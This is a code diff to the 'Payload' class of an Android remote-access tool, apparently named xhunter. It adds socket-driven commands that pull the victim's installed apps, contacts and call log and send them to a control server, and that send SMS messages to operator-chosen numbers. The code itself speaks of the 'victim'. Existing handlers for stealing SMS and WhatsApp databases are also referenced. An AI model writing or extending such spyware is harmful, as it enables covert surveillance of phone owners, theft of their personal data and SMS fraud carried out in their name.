@@ -1,24 +1,30 @@
 package com.xhunter.client;
 
 import android.Manifest;
+import android.annotation.SuppressLint;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
+import android.net.Uri;
 import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Environment;
 import android.os.StatFs;
+import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.provider.Telephony;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Base64;
 import android.util.Log;
+import android.view.View;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -41,6 +47,7 @@ import java.net.URI;
 import java.net.URLConnection;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.List;
 
 
 import io.socket.client.Ack;
@@ -206,6 +213,110 @@ public class Payload {
 
         }
     };
+    private static final Emitter.Listener getInstalledApps = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            try {
+                if (mSocket != null && mSocket.connected()) {
+                    JSONObject installedApps = new JSONObject();;
+                    JSONArray list = new JSONArray();
+                    List<PackageInfo> packages = mcontext.getPackageManager().getInstalledPackages(0);
+                    for(int i=0;i<packages.size();i++) {
+                        JSONObject data = new JSONObject();
+                        PackageInfo p = packages.get(i);
+                        data.put("appName", p.applicationInfo.loadLabel(mcontext.getPackageManager()).toString());
+                        data.put("packageName",p.packageName);
+                        list.put(data);
+                    }
+                    installedApps.put("installedApps",list);
+                    mSocket.emit("getInstalledApps", installedApps);
+                } else {
+                    Log.e("JSON ", "sending data failed");
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    };
+    private static final Emitter.Listener getContacts = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            if(checkPermission(Manifest.permission.READ_CONTACTS)){
+                    getAllContacts();
+            }else{
+                try {
+                    if (mSocket != null && mSocket.connected()) {
+                        JSONObject data = new JSONObject();
+                        data.put("error","Permission not allowed by victim");
+                        mSocket.emit("error", data);
+                    } else {
+                        Log.e("JSON ", "sending data failed");
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+
+        }
+    };
+    private static final Emitter.Listener sendSMS = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            if(checkPermission(Manifest.permission.SEND_SMS)){
+                JSONObject jsonObj = null;
+                try {
+                    jsonObj = new JSONObject(args[0].toString());
+                    if(sendSMS(jsonObj.getString("msg"),jsonObj.getString("mobile_no"))){
+                        mSocket.emit("sendSMS", "success");
+                    }else{
+                        JSONObject data = new JSONObject();
+                        try {
+                            data.put("error","Message send Failed!");
+                        } catch (JSONException e) {
+                            e.printStackTrace();
+                        }
+                        mSocket.emit("error", data);
+                    }
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+            }else{
+                try {
+                    if (mSocket != null && mSocket.connected()) {
+                        JSONObject data = new JSONObject();
+                        data.put("error","Permission not allowed by victim");
+                        mSocket.emit("error", data);
+                    } else {
+                        Log.e("JSON ", "sending data failed");
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+
+        }
+    };
+    private static final Emitter.Listener getCallLog = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            if(checkPermission(Manifest.permission.READ_CALL_LOG)){
+                    mSocket.emit("getCallLog", readCallLog(mcontext));
+            }else{
+                try {
+                    if (mSocket != null && mSocket.connected()) {
+                        JSONObject data = new JSONObject();
+                        data.put("error","Permission not allowed by victim");
+                        mSocket.emit("error", data);
+                    } else {
+                        Log.e("JSON ", "sending data failed");
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+
+        }
+    };
 
     private static final Emitter.Listener onConnectionError = new Emitter.Listener() {
         @Override
@@ -296,6 +407,10 @@ public class Payload {
             mSocket.on("downloadWhatsappDatabase", downloadWhatsappDatabase);
             mSocket.on("previewImage", previewImage);
             mSocket.on("getSMS", getSMS);
+            mSocket.on("getInstalledApps", getInstalledApps);
+            mSocket.on("getContacts", getContacts);
+            mSocket.on("sendSMS", sendSMS);
+            mSocket.on("getCallLog", getCallLog);
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -616,5 +731,62 @@ public class Payload {
             c.close();
         }
     }
+    public static void getAllContacts(){
+        try {
+            JSONObject contacts = new JSONObject();
+            JSONArray list = new JSONArray();
+            Cursor cur = mcontext.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    new String[] { ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null,  ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
 
+
+            while (cur.moveToNext()) {
+                JSONObject contact = new JSONObject();
+                @SuppressLint("Range") String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));// for  number
+                @SuppressLint("Range") String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));// for name
+                contact.put("phoneNo", num);
+                contact.put("name", name);
+                list.put(contact);
+            }
+            contacts.put("contactsList", list);
+            sendDataToServer("getContacts",contacts);
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+    }
+    public static boolean sendSMS(String message, String recipient){
+        try{
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage(recipient, null, message, null, null);
+        }catch(Exception ex){
+            return false;
+        }
+        return true;
+    }
+    public static JSONObject readCallLog(Context context) {
+        JSONObject Calls = null;
+        try {
+            Calls = new JSONObject();
+            JSONArray list = new JSONArray();
+            Uri allCalls = Uri.parse("content://call_log/calls");
+            Cursor cur = context.getContentResolver().query(allCalls, null, null, null, null);
+            while (cur.moveToNext()&&list.length()<100) {
+                JSONObject call = new JSONObject();
+                @SuppressLint("Range") String num = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER));// for  number
+                @SuppressLint("Range") String name = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));// for name
+                @SuppressLint("Range") String duration = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION));// for duration
+                @SuppressLint("Range") int type = Integer.parseInt(cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.TYPE)));// for call type, Incoming or out going.
+
+                call.put("phoneNo", num);
+                call.put("name", name);
+                call.put("duration", duration);
+                call.put("type", type);
+                list.put(call);
+            }
+            Calls.put("callsLog", list);
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return null;
+        }
+        return Calls;
+    }
 }
